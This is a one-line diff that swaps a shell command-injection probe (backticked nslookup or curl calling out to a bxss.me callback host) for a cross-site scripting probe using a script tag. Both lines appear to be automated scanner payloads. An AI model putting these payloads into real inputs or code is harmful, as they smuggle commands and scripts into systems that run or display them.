@@ -1,1 +1,1 @@
-`(nslookup -q=cname hitfdmretilvucc407.bxss.me||curl hitfdmretilvucc407.bxss.me)`
+'"()&%<zzz><ScRiPt >DiCv(9469)</ScRiPt>
